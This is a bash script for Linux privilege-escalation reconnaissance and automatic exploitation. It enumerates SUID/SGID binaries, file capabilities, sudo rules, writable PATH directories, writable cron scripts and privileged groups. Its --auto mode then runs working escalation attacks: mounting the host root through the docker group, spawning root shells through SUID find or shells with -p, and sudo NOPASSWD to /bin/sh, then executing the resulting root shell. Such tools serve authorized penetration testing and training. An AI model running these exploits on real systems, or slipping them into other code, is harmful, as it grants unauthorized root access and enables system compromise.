#!/usr/bin/env bash
# bINsUID bash scanner — privesc recon and auto-exploit without Python.
# Usage: binsuid-scan.sh [--quick] [--auto] [-y] [--dry-run] [--silent] [--no-color] [--debug]
VERSION="1.1.9"

QUICK=0
SILENT=0
NO_COLOR=0
DEBUG=0
AUTO=0
ASSUME_YES=0
DRY_RUN=0

for arg in "$@"; do
  case "$arg" in
    --quick|-q) QUICK=1 ;;
    --silent) SILENT=1 ;;
    --no-color) NO_COLOR=1 ;;
    --debug) DEBUG=1 ;;
    --auto) AUTO=1 ;;
    -y|--yes) ASSUME_YES=1 ;;
    --dry-run) DRY_RUN=1; AUTO=1 ;;
    --scan-only|--version|-V|-h|--help) ;;
    --json)
      echo "[-] --json needs python3 (binsuid --json --scan-only)." >&2
      exit 1
      ;;
    --upgrade|-u)
      d="$(cd "$(dirname "${BASH_SOURCE[0]:-$0}")" && pwd)"
      if [ -f "$d/upgrade-binsuid.sh" ]; then
        exec "$d/upgrade-binsuid.sh" --force "$@"
      fi
      echo "[-] --upgrade needs upgrade-binsuid.sh on this host." >&2
      exit 1
      ;;
    -V|--version) echo "binsuid-scan $VERSION (bash mode)"; exit 0 ;;
    -h|--help)
      echo "binsuid-scan $VERSION — bash privesc recon + auto-exploit"
      echo "  --quick  --auto  -y  --dry-run  --silent  --no-color  --debug"
      echo ""
      echo "Examples:"
      echo "  binsuid-scan.sh --quick              # recon only"
      echo "  binsuid-scan.sh --auto -y            # scan then auto-escalate"
      echo "  binsuid-scan.sh --auto --dry-run -y  # show exploit commands"
      exit 0
      ;;
    *) echo "Unknown option: $arg" >&2; exit 2 ;;
  esac
done

dbg() { [ "$DEBUG" -eq 1 ] && echo "[debug] $*" >&2; }

use_color() {
  [ "$NO_COLOR" -eq 1 ] && return 1
  [ -n "${NO_COLOR:-}" ] && return 1
  [ -n "${FORCE_COLOR:-}" ] && return 0
  [ -t 1 ] && return 0
  return 1
}

init_colors() {
  if use_color; then
    RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'
    BLUE='\033[34m'; MAGENTA='\033[35m'; CYAN='\033[36m'
    BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'
  else
    RED=''; GREEN=''; YELLOW=''; BLUE=''; MAGENTA=''
    CYAN=''; BOLD=''; DIM=''; RESET=''
  fi
}

init_colors

# printf is more reliable than echo for ANSI on minimal shells
p() { printf '%b\n' "$*"; }

section() {
  # section COLOR "title"
  p "${1}${BOLD}>>> ${2}${RESET}"
}

tag_item() {
  # tag_item TAG_COLOR TAG "label" VALUE_COLOR "value"
  p "  ${2}[${3}]${RESET} ${5}${4}${RESET}"
}

is_known_suid() {
  case "$1" in
    /usr/bin/sudo|/usr/bin/su|/usr/bin/passwd|/usr/bin/chfn|/usr/bin/chsh|\
/usr/bin/newgrp|/usr/bin/gpasswd|/usr/bin/mount|/usr/bin/umount|/usr/bin/pkexec|\
/usr/lib/openssh/ssh-keysign|/bin/mount|/bin/umount|/bin/su)
      return 0 ;;
  esac
  return 1
}

SUID_PRIORITY=""
SUID_NOISE=""
SGID_FOUND=""
CAP_FOUND=""
PATH_FOUND=""
CRON_FOUND=""
GROUP_FOUND=""
ERRORS=""
SUDO_OUT=""
PRIORITY_COUNT=0

add_line() {
  # add_line VAR "line"
  eval "$1=\"\${$1}\${$1:+\$'\n'}\$2\""
}

scan_suid() {
  dbg "scan_suid quick=$QUICK"
  local roots paths f
  if [ "$QUICK" -eq 1 ]; then
    roots="/usr/local/bin /usr/local/sbin /opt /home /var /tmp /snap/bin /usr/bin /usr/sbin /bin /sbin"
  else
    roots="/"
  fi

  if ! command -v find >/dev/null 2>&1; then
    ERRORS="${ERRORS}${ERRORS:+$'\n'}find not found"
    return
  fi

  if [ "$QUICK" -eq 1 ]; then
    for root in $roots; do
      [ -d "$root" ] || continue
      paths="$(find "$root" -xdev -type f -perm -4000 2>/dev/null)" || paths=""
      for f in $paths; do
        [ -n "$f" ] || continue
        if is_known_suid "$f"; then
          add_line SUID_NOISE "$f"
        else
          add_line SUID_PRIORITY "$f"
        fi
      done
    done
  else
    paths="$(find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
      -type f -perm -4000 -print 2>/dev/null)" || paths=""
    for f in $paths; do
      [ -n "$f" ] || continue
      if is_known_suid "$f"; then
        add_line SUID_NOISE "$f"
      else
        add_line SUID_PRIORITY "$f"
      fi
    done
  fi
}

scan_sgid() {
  dbg "scan_sgid"
  local roots="/usr/bin /usr/sbin /usr/local/bin /opt /bin /sbin /home /var"
  local f paths
  command -v find >/dev/null 2>&1 || return
  for root in $roots; do
    [ -d "$root" ] || continue
    paths="$(find "$root" -xdev -type f -perm -2000 2>/dev/null)" || paths=""
    for f in $paths; do
      [ -n "$f" ] && add_line SGID_FOUND "$f"
    done
  done
}

scan_capabilities() {
  dbg "scan_capabilities"
  command -v getcap >/dev/null 2>&1 || {
    ERRORS="${ERRORS}${ERRORS:+$'\n'}getcap not found"
    return
  }
  local root line
  for root in /usr/bin /usr/sbin /bin /sbin /usr/local/bin /opt /home; do
    [ -e "$root" ] || continue
  done
  while IFS= read -r line; do
    [ -n "$line" ] && add_line CAP_FOUND "$line"
  done <<EOF
$(getcap -r /usr /opt /home 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_sys_admin|cap_dac_read_search|cap_setfcap' 2>/dev/null || true)
EOF
}

scan_sudo() {
  dbg "scan_sudo"
  command -v sudo >/dev/null 2>&1 || {
    ERRORS="${ERRORS}${ERRORS:+$'\n'}sudo not found"
    return
  }
  SUDO_OUT="$(sudo -n -l 2>/dev/null)" || {
    ERRORS="${ERRORS}${ERRORS:+$'\n'}sudo -l requires password"
    SUDO_OUT=""
  }
}

scan_path() {
  dbg "scan_path"
  local d mode other old_ifs
  old_ifs="$IFS"
  IFS=':'
  for d in ${PATH:-/usr/bin:/bin}; do
    [ -d "$d" ] || continue
    if [ -w "$d" ]; then
      add_line PATH_FOUND "$d (writable)"
      continue
    fi
    mode="$(stat -c '%a' "$d" 2>/dev/null)" || mode=""
    if [ -n "$mode" ]; then
      other=$((mode % 10))
      [ "$other" -ge 2 ] && add_line PATH_FOUND "$d (world-writable)"
    fi
  done
  IFS="$old_ifs"
}

scan_cron() {
  dbg "scan_cron"
  local f line script
  for f in /etc/crontab /etc/cron.d/*; do
    [ -r "$f" ] || continue
    while IFS= read -r line; do
      case "$line" in \#*|"") continue ;; esac
      for script in $(echo "$line" | grep -oE '/[[:alnum:]_.~/-]+' 2>/dev/null || true); do
        if [ -f "$script" ] && [ -w "$script" ]; then
          add_line CRON_FOUND "$script (writable, from $f)"
        fi
      done
    done < "$f"
  done
}

scan_groups() {
  dbg "scan_groups"
  local groups g hint
  groups="$(id -Gn 2>/dev/null | tr '[:upper:]' '[:lower:]')" || groups=""
  [ -n "$groups" ] || return 0
  for g in docker lxd disk adm sudo wheel; do
    echo " $groups " | grep -q " $g " 2>/dev/null || continue
    case "$g" in
      docker) hint="docker run -v /:/mnt --rm -it alpine chroot /mnt sh" ;;
      lxd)    hint="privileged lxc container" ;;
      disk)   hint="debugfs block device access" ;;
      adm)    hint="read /var/log/auth.log" ;;
      *)      hint="sudo -l" ;;
    esac
    add_line GROUP_FOUND "$g — $hint"
  done
}

count_lines() {
  if [ -z "$1" ]; then echo 0; return; fi
  echo "$1" | grep -c '.' || echo 0
}

member_of_group() {
  local g="$1"
  id -Gn 2>/dev/null | tr '[:upper:]' '[:lower:]' | grep -qw "$g"
}

try_docker_group() {
  member_of_group docker || return 1
  command -v docker >/dev/null 2>&1 || return 1
  local cmd="docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
  local verify="docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u'"
  p "${YELLOW}[*] Trying docker group escalation...${RESET}"
  if [ "$DRY_RUN" -eq 1 ]; then
    p "${GREEN}[+] Dry-run:${RESET} $verify"
    p "    then: $cmd"
    return 0
  fi
  local uid
  uid="$(docker run -v /:/mnt --rm alpine chroot /mnt sh -c 'id -u' 2>/dev/null)" || return 1
  [ "$uid" = "0" ] || return 1
  p "${GREEN}[+] SUCCESS — root via docker group (host at /mnt in container)${RESET}"
  if [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ]; then
    p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
    exec $cmd
  fi
  p "${CYAN}[*] Run manually:${RESET} $cmd"
  return 0
}

try_suid_binary() {
  local bin="$1" name="${bin##*/}" cmd="" out=""
  [ -x "$bin" ] || return 1
  case "$name" in
    find)
      cmd="cd / && $bin . -exec /bin/sh -p \\; -quit"
      p "${YELLOW}[*] Trying SUID $bin ...${RESET}"
      if [ "$DRY_RUN" -eq 1 ]; then
        p "${GREEN}[+] Dry-run:${RESET} $cmd"
        return 0
      fi
      (cd / && "$bin" . -exec /bin/sh -p -c 'id -u' \; -quit 2>/dev/null) | grep -q '^0$' || return 1
      ;;
    bash|sh|dash|ash|zsh|ksh)
      cmd="$bin -p"
      p "${YELLOW}[*] Trying SUID $bin ...${RESET}"
      if [ "$DRY_RUN" -eq 1 ]; then
        p "${GREEN}[+] Dry-run:${RESET} $cmd"
        return 0
      fi
      out="$("$bin" -p -c 'id -u' 2>/dev/null)" || return 1
      [ "$out" = "0" ] || return 1
      ;;
    *)
      return 1
      ;;
  esac
  p "${GREEN}[+] SUCCESS — SUID $name${RESET}"
  if [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ]; then
    p "${CYAN}[*] Launching root shell (exit to return)...${RESET}"
    eval "exec $cmd"
  fi
  p "${CYAN}[*] Run:${RESET} $cmd"
  return 0
}

try_sudo_nopasswd() {
  [ -n "$SUDO_OUT" ] || return 1
  echo "$SUDO_OUT" | grep -qiE 'NOPASSWD.*\bALL\b' || return 1
  local cmd="sudo -n /bin/sh"
  p "${YELLOW}[*] Trying NOPASSWD sudo ALL...${RESET}"
  if [ "$DRY_RUN" -eq 1 ]; then
    p "${GREEN}[+] Dry-run:${RESET} $cmd"
    return 0
  fi
  sudo -n /bin/sh -c 'id -u' 2>/dev/null | grep -q '^0$' || return 1
  p "${GREEN}[+] SUCCESS — NOPASSWD sudo${RESET}"
  [ "$ASSUME_YES" -eq 1 ] && [ -t 0 ] && [ -t 1 ] && exec $cmd
  p "${CYAN}[*] Run:${RESET} $cmd"
  return 0
}

auto_escalate() {
  p ""
  p "${CYAN}${BOLD}>>> Auto-exploit${RESET}"
  try_docker_group && return 0
  if [ -n "$SUID_PRIORITY" ]; then
    local bin old_ifs
    old_ifs="$IFS"
    IFS=$'\n'
    for bin in $SUID_PRIORITY; do
      [ -n "$bin" ] && try_suid_binary "$bin" && { IFS="$old_ifs"; return 0; }
    done
    IFS="$old_ifs"
  fi
  try_sudo_nopasswd && return 0
  p "${RED}[-] No automatic escalation succeeded.${RESET}"
  return 1
}

# --- run scans ---
scan_suid
scan_sgid
scan_capabilities
scan_sudo
scan_path
scan_cron
scan_groups

PRIORITY_COUNT=$(( $(count_lines "$SUID_PRIORITY") + $(count_lines "$SGID_FOUND") + \
  $(count_lines "$CAP_FOUND") + $(count_lines "$PATH_FOUND") + \
  $(count_lines "$CRON_FOUND") + $(count_lines "$GROUP_FOUND") ))
[ -n "$SUDO_OUT" ] && PRIORITY_COUNT=$((PRIORITY_COUNT + 1))

if [ "$SILENT" -eq 1 ]; then
  p "Priority: $PRIORITY_COUNT | SUID: $(count_lines "$SUID_PRIORITY") | bash $VERSION"
  [ "$PRIORITY_COUNT" -gt 0 ] && exit 1 || exit 0
fi

p "${CYAN}==============================================${RESET}"
p "${BOLD}  bINsUID scan (bash ${CYAN}$VERSION${RESET}${BOLD})${RESET}"
p "${CYAN}==============================================${RESET}"
if [ "$AUTO" -eq 1 ]; then
  p "${DIM}  Auto-exploit mode — tries best vector after scan.${RESET}"
else
  p "${DIM}  Recon only — add --auto -y to escalate.${RESET}"
fi
p ""

if [ -n "$SUID_PRIORITY" ]; then
  section "$RED" "SUID priority targets"
  echo "$SUID_PRIORITY" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$RED" "$RED" "SUID" "$BOLD" "$p"
  done
  p ""
fi

if [ -n "$SGID_FOUND" ]; then
  section "$RED" "SGID binaries"
  echo "$SGID_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$RED" "$RED" "SGID" "" "$p"
  done
  p ""
fi

if [ -n "$SUDO_OUT" ]; then
  section "$CYAN" "Sudo rules"
  echo "$SUDO_OUT" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$CYAN" "$CYAN" "SUDO" "" "$p"
  done
  p ""
fi

if [ -n "$CAP_FOUND" ]; then
  section "$MAGENTA" "Dangerous capabilities"
  echo "$CAP_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$MAGENTA" "$MAGENTA" "CAPS" "" "$p"
  done
  p ""
fi

if [ -n "$PATH_FOUND" ]; then
  section "$YELLOW" "Writable PATH"
  echo "$PATH_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$YELLOW" "$YELLOW" "PATH" "" "$p"
  done
  p ""
fi

if [ -n "$CRON_FOUND" ]; then
  section "$YELLOW" "Writable cron scripts"
  echo "$CRON_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$YELLOW" "$YELLOW" "CRON" "" "$p"
  done
  p ""
fi

if [ -n "$GROUP_FOUND" ]; then
  section "$GREEN" "Privileged groups"
  echo "$GROUP_FOUND" | while IFS= read -r p; do
    [ -n "$p" ] && tag_item "$GREEN" "$GREEN" "GROUP" "$BOLD" "$p"
  done
  p ""
fi

p "${CYAN}${BOLD}Summary${RESET}"
p "  ${BOLD}Priority targets${RESET}    : ${MAGENTA}${BOLD}$PRIORITY_COUNT${RESET}"
p "  ${DIM}System SUID hidden${RESET}  : $(count_lines "$SUID_NOISE")"

if [ -n "$ERRORS" ]; then
  p ""
  p "${YELLOW}${BOLD}Warnings${RESET}"
  echo "$ERRORS" | while IFS= read -r e; do
    [ -n "$e" ] && p "  ${YELLOW}-${RESET} ${DIM}$e${RESET}"
  done
fi

if [ "$PRIORITY_COUNT" -eq 0 ]; then
  p ""
  p "${YELLOW}No custom targets in quick paths. Try full scan or manual:${RESET}"
  p "  ${DIM}find / -perm -4000 -type f 2>/dev/null | grep -vE 'passwd|mount|su\$|...'${RESET}"
  p "  ${DIM}find /home /var /opt -writable -type f 2>/dev/null | head -20${RESET}"
  p "  ${DIM}getcap -r / 2>/dev/null${RESET}"
fi

if [ "$AUTO" -eq 1 ]; then
  auto_escalate
  exit $?
fi

[ "$PRIORITY_COUNT" -gt 0 ] && exit 1 || exit 0
